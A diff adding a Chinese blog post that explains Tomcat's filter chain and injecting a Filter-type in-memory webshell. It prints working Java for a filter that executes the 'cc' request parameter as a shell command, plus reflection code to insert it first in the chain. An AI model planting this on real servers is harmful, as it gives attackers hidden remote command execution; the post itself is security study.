@@ -1,0 +1,795 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="P1taya">
+    
+    <title>
+        
+            Tomcat内存马—Filter型 |
+        
+        P1taya
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/p1taya.jpg">
+    
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/font/css/brands.min.css">
+    
+        
+            
+                
+<link rel="stylesheet" href="/css/demo1.css">
+
+            
+        
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"jsdelivr"},"pjax":{"enable":false},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]},"root":"","source_data":{"links":[{"name":"小黄dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"🐶狗and猫","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]},"version":"4.1.1"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/p1taya.jpg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               P1taya
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                
+                                    <i class="menu-icon fa-solid fa-home"></i>
+                                
+                                首页
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                
+                                    <i class="menu-icon fa-solid fa-box-archive"></i>
+                                
+                                归档
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                
+                                    <i class="menu-icon fa-solid fa-layer-group"></i>
+                                
+                                分类
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                
+                                    <i class="menu-icon fa-solid fa-link"></i>
+                                
+                                友链
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                
+                                    <i class="menu-icon fa-solid fa-user-graduate"></i>
+                                
+                                关于
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/photos"
+                            >
+                                
+                                    <i class="menu-icon fa-solid fa-image"></i>
+                                
+                                相册
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/"
+                    >首页</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives"
+                    >归档</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories"
+                    >分类</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links"
+                    >友链</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about"
+                    >关于</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/photos"
+                    >相册</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        Tomcat内存马—Filter型
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/p1taya.jpg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">P1taya</span>
+                                
+                                    <span class="author-badge">Lv4</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2023-06-11 23:42:29</span>
+            </span>
+
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Wed Apr 17 2024 16:43:01 GMT+0800">2024-04-17 16:43:01</span>
+            </span>
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/%E5%AD%A6%E4%B9%A0/">学习</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>2.5k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>11 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body">
+                    
+
+                    <h2 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h2><p>Filter也就是过滤器，用来拦截servlet容器发送给某个servlet的请求以及servlet返回的响应。Filter可以在 <code>web.xml</code>中注册，借一张图来展示一下存在Filter时，处理请求及发送响应的流程。</p>
+<p>从图中我们也可以知道，Filter可以有多个。存在Filter时，客户端发送的请求会先经过Filter再到servlet，如果我们自定义一个Filter，并在其中添加恶意代码，这样也就能达到命令执行的效果。不过我们还需要使其在这条Filterchain的最前方，我猜测这样做是为了接受到原始的请求，避免前面的过滤器拦截我们的请求或者修改我们的请求内容。</p>
+<h3 id="测试demo"><a href="#测试demo" class="headerlink" title="测试demo"></a>测试demo</h3><p>为了更好的理解Filter，写一个demo</p>
+<p>testfilter.java</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import javax.servlet.*;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class testfilter implements Filter&#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class="line">        System.out.println(&quot;filter初始化&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;</span><br><span class="line">        System.out.println(&quot;dofilter&quot;);</span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>web.xml</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span><br><span class="line">         version=&quot;4.0&quot;&gt;</span><br><span class="line">    &lt;filter&gt;</span><br><span class="line">        &lt;filter-name&gt;testfilter&lt;/filter-name&gt;</span><br><span class="line">        &lt;filter-class&gt;testfilter&lt;/filter-class&gt;</span><br><span class="line">    &lt;/filter&gt;</span><br><span class="line"></span><br><span class="line">    &lt;filter-mapping&gt;</span><br><span class="line">        &lt;filter-name&gt;testfilter&lt;/filter-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/filter&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/filter-mapping&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line">        &lt;!--servlet名字，和类名一致--&gt;</span><br><span class="line">        &lt;servlet-name&gt;test&lt;/servlet-name&gt;</span><br><span class="line">        &lt;!--class文件名，如果有包要加上包名--&gt;</span><br><span class="line">        &lt;servlet-class&gt;test&lt;/servlet-class&gt;</span><br><span class="line">    &lt;/servlet&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;test&lt;/servlet-name&gt;</span><br><span class="line">        &lt;!--url--&gt;</span><br><span class="line">        &lt;url-pattern&gt;/test&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/servlet-mapping&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后访问一下 <code>/filter</code></p>
+<p>成功触发过滤器</p>
+<h3 id="Filter相关类"><a href="#Filter相关类" class="headerlink" title="Filter相关类"></a>Filter相关类</h3><p>from <a class="link"   target="_blank" rel="noopener" href="https://paper.seebug.org/1441/#tomcat" >https://paper.seebug.org/1441/#tomcat<i class="fas fa-external-link-alt"></i></a></p>
+<ul>
+<li><p><strong>Filter</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤器接口一个 Filter 程序就是一个 Java 类，这个类必须实现 Filter 接口。javax.servlet.Filter 接口中定义了三个方法：init(Web 容器创建 Filter 的实例对象后，将立即调用该 Filter 对象的 init 方法)、doFilter(当一个 Filter 对象能够拦截访问请求时，Servlet 容器将调用 Filter 对象的 doFilter 方法)、destory(该方法在 Web 容器卸载 Filter 对象之前被调用)。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>FilterChain</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤器链 FilterChain 对象中有一个 doFilter() 方法，该方法的作用是让 Filter 链上的当前过滤器放行，使请求进入下一个 Filter.Filter和FilterChain密不可分, Filter可以实现依次调用正是因为有了FilterChain</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>FilterConfig</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤器的配置,与普通的 Servlet 程序一样，Filter 程序也很可能需要访问 Servlet 容器。Servlet 规范将代表 ServletContext 对象和 Filter 的配置参数信息都封装到一个称为 FilterConfig 的对象中。FilterConfig 接口则用于定义 FilterConfig 对象应该对外提供的方法，以便在 Filter 程序中可以调用这些方法来获取 ServletContext 对象，以及获取在 web.xml 文件中为 Filter 设置的友好名称和初始化参数。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>FilterDef</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤器的配置和描述</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>ApplicationFilterChain</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">调用过滤器链</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>ApplicationFilterConfig</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">获取过滤器</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>ApplicationFilterFactory</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">组装过滤器链</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>WebXml</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一个存放web.xml中内容的类</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>ContextConfig</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一个web应用的上下文配置类</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>StandardContext</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一个web应用上下文(Context接口)的标准实现</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>StandardWrapperValve</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">一个标准Wrapper的实现。一个上下文一般包括一个或者多个包装器，每一个包装器表示一个servlet。</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="Tomcat-Filter调用流程"><a href="#Tomcat-Filter调用流程" class="headerlink" title="Tomcat Filter调用流程"></a>Tomcat Filter调用流程</h3><p>首先 <code>ContextConfig$configureContext</code> 对 <code>web.xml</code> 进行解析，获取到 <code>WebXml</code> 实例</p>
+<p>然后直接看到 <code>StandardWrapperValve</code> ，在这里将会完成过滤器的组装</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);</span><br></pre></td></tr></table></figure>
+
+<p>看到这行代码，发现 <code>filterchain</code> 是由 <code>ApplicationFilterFactory$createFilterChain</code> 创建的，跟进该方法</p>
+<p>前面的代码主要是初始化 <code>filterchain</code> 变量，这里使用 <code>StandardWrapper$getParent</code> 获取当前 <code>Context</code> 也就是当前运行的WEB应用，然后使用 <code>Context</code> 的 <code>findFilterMaps</code> 获取到 <code>filterMaps</code></p>
+<p><code>filterMaps</code> 中存放了已定义的及自带的 <code>filterMap</code> ，而 <code>filterMap</code> 中存放了 filtername 及 url，然后看看 <code>filter</code> 的组装逻辑</p>
+<p><code>for循环</code> 遍历 <code>filterMaps</code> ，如果当前请求的 <code>url</code> 和 <code>filterMap</code> 中的 <code>urlPatterns</code> 相同，就会调用 <code>findFilterConfig</code> 方法寻找对应 <code>filtername</code> 的 <code>FilterConfig</code> ，如果找到就调用 <code>addFilter</code> 方法将 <code>filterConfig</code> 加入到 <code>filterChain</code></p>
+<p>跟进 <code>addFilter</code> 方法，该方法首先遍历 <code>filterChain</code> ，看看要添加的 <code>filter</code> 是否已经存在。如果存在就直接 <code>return</code></p>
+<p>如果n等于 <code>filters</code> 的长度，就说明过滤器数组满了，然后就对其进行扩容，一次扩大十个单位长度，最后将其添加进 <code>filters</code> 。至此 <code>filterChain</code> 也就组装完成了，接着回到 <code>StandardWrapperValve</code> 执行 <code>ApplicationFilterChain$doFilter</code></p>
+<p>然后跟进 <code>doFilter</code> 方法</p>
+<p>调用了 <code>internalDoFilter</code> 方法</p>
+<p>先获取 <code>filterConfig</code> ，然后通过 <code>filterConfig.getFilter()</code> 获取到 <code>filter</code> ，再调用 <code>filter</code> 的 <code>doFilter</code> 方法，就结束了 Filter 的调用。</p>
+<p>总结一下流程</p>
+<ul>
+<li>先从当前 <code>Context</code> 中获取到 <code>filterMaps</code></li>
+<li>筛选出 <code>urlPattern</code> 与当前请求 url 相符合的 <code>filtername</code></li>
+<li>根据 <code>filtername</code> 找到对应的 <code>FilterConfig</code></li>
+<li>将 <code>FilterConfig</code> 加入到 <code>filterChain</code></li>
+<li>调用 <code>filterChain</code> 的 <code>internalDoFilter</code> 遍历获取 <code>FilterConfig</code></li>
+<li>然后获取 <code>FiletrConfig</code> 对应的 <code>Filter</code> ，并调用 <code>Filter</code> 的 <code>doFilter</code></li>
+</ul>
+<h2 id="filter内存马注入"><a href="#filter内存马注入" class="headerlink" title="filter内存马注入"></a>filter内存马注入</h2><p>理清了流程，现在在就要实现内存马注入了。上面写了一个添加filter的demo，其中我们修改了配置文件，如果我们注入内存马也要修改配置文件，那显然是不行的，很容易就被排查出来了，而且还需要重启应用，所以我们要想办法实现动态 <code>filter</code> 注入。</p>
+<p>回想一下 <code>filter</code> 的获取流程，可以发现 <code>filterMaps</code> 是从当前 <code>context</code> 中获取到的</p>
+<p>那如果我们可以对这个 <code>context</code> 中存储的 <code>filterMaps</code> 进行修改是不是就可以注入自己的恶意 <code>filter</code> 了。</p>
+<p>那么怎么修改呢，我们先看一下这个 <code>context</code> ， <code>StandardContext</code> 有三个关于 <code>filter</code> 的成员变量</p>
+<ul>
+<li>filterConfigs：存储 <code>filterConfig</code> 的 <code>HashMap</code> ， <code>filterConfig</code> 中又存储了 <code>FilterDef</code> 和 <code>filter</code> 对象</li>
+<li>filterDefs：存放 <code>FilterDef</code> 的 <code>HashMap</code> ，<strong>FilterDef</strong>中存储着过滤器名，过滤器实例，匹配的url 等</li>
+<li>filterMaps：存放 <code>FilterMap</code> 的 <code>HashMap</code> ， <code>FilterMap</code> 中主要存放了 <code>FilterName</code> 和对应的 <code>URLPattern</code></li>
+</ul>
+<p>注入流程如下</p>
+<ul>
+<li>创建恶意 <code>filter</code></li>
+<li>使用 <code>FilterDef</code> 封装恶意 <code>filter</code></li>
+<li>将该 <code>FilterDef</code> 添加到 <code>FilterDefs</code> 和 <code>FilterConfig</code></li>
+<li>建立恶意 <code>filter</code> 对应的 <code>filterMap</code> ，并将其加入到 <code>filterMaps</code> 中(将其放到最前面)</li>
+</ul>
+<p>大概代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">//创建filter</span><br><span class="line">        Filter filter=new Filter() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            @Override</span><br><span class="line">            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;</span><br><span class="line">                HttpServletRequest req = (HttpServletRequest) servletRequest;</span><br><span class="line">                if (req.getParameter(&quot;cc&quot;) != null)&#123;</span><br><span class="line">                    byte[] bytes = new byte[1024];</span><br><span class="line">                    InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+req.getParameter(&quot;cc&quot;)).getInputStream();</span><br><span class="line"></span><br><span class="line">                    ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">                    byte[] b = new byte[1024];</span><br><span class="line">                    int a = -1;</span><br><span class="line"></span><br><span class="line">                    while ((a = in.read(b)) != -1) &#123;</span><br><span class="line">                        baos.write(b, 0, a);</span><br><span class="line">                    &#125;</span><br><span class="line">                    servletResponse.getWriter().write(new String(baos.toByteArray()));</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            @Override</span><br><span class="line">            public void destroy() &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        //封装filter</span><br><span class="line">        String filtername=&quot;novic4&quot;;</span><br><span class="line">        FilterDef filterDef=new FilterDef();</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        filterDef.setFilterName(filtername);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line"></span><br><span class="line">        //将filterdef添加到filterdefs中</span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">        //将filterdef添加到filterconfig中</span><br><span class="line">        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">        constructor.setAccessible(true);</span><br><span class="line">        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line"></span><br><span class="line">        //建立对应得filterMap</span><br><span class="line">        FilterMap filterMap = new FilterMap();</span><br><span class="line">        filterMap.addURLPattern(&quot;/*&quot;);</span><br><span class="line">        filterMap.setFilterName(filtername);</span><br><span class="line">        //这里用到的 javax.servlet.DispatcherType类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">        //插入filterMaps，将其插到首位</span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">        //添加到filterconfigs</span><br><span class="line">        Field Configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);</span><br><span class="line">        Configs.setAccessible(true);</span><br><span class="line">        Map filterConfigs = (Map) Configs.get(standardContext);</span><br><span class="line">        filterConfigs.put(filtername,filterConfig);</span><br></pre></td></tr></table></figure>
+
+<p>要想修改这个 <code>context</code> ，就需要先获取到该 <code>context</code>,已知有三种获取方式</p>
+<ul>
+<li><p><strong>将 <code>servletcontext</code> 转换成 <code>StandardContext</code></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web容器启动时，每个web应用都会创建一个servletcontext对象，代表当前web应用</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ServletContext servletContext = request.getSession().getServletContext();</span><br><span class="line">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">    appctx.setAccessible(true);</span><br><span class="line">        // ApplicationContext 为 ServletContext 的实现类</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">    stdctx.setAccessible(true);</span><br><span class="line">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><strong>通过Mbean获取context</strong></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[https://paper.seebug.org/1441/#2mbeancontext](https://paper.seebug.org/1441/#2mbeancontext)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>从线程中获取StandardContext</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[https://zhuanlan.zhihu.com/p/114625962](https://zhuanlan.zhihu.com/p/114625962)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>这里使用第一种方式写一个内存马</p>
